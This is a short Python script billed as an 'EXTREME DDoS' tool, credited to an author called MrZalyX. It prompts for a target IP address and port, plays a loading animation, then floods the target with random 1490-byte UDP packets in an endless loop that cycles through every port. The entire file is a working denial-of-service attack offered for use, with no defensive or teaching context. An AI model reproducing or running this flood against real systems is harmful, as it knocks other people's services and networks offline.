import os
import sys
import time
import socket
import random
import ipaddress
from datetime import datetime

def clear_terminal():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    clear_terminal()
    os.system("figlet EXTREME DDoS")
    print("Author : MrZalyX")
    print("GitHub : https://github.com/MrZalyX\n")

def get_target():
    while True:
        ip = input("Target IP Address : ")
        try:
            ipaddress.ip_address(ip)
            break
        except ValueError:
            print("Invalid IP address, please enter a correct IPv4 or IPv6 address.")

    while True:
        try:
            port = int(input("Target Port       : "))
            if 0 < port < 65536:
                break
            else:
                print("Port must be between 1 and 65535.")
        except ValueError:
            print("Please enter a valid port number.")

    return ip, port

def loading_animation():
    clear_terminal()
    os.system("figlet Starting Attack")
    bar_length = 20
    for p in range(1, 101):
        filled_length = p * bar_length // 100
        bar = '=' * filled_length + ' ' * (bar_length - filled_length)
        sys.stdout.write(f"\r[{bar}] {p}%")
        sys.stdout.flush()
        time.sleep(0.1)
    print()

def start_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(payload, (ip, port))
            sent += 1
            port += 1
            if sent % 1000 == 0:
                print(f"Sent {sent} packets to {ip} through port {port}")
            if port > 65534:
                port = 1
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

if __name__ == "__main__":
    banner()
    ip, port = get_target()
    loading_animation()
    start_attack(ip, port)
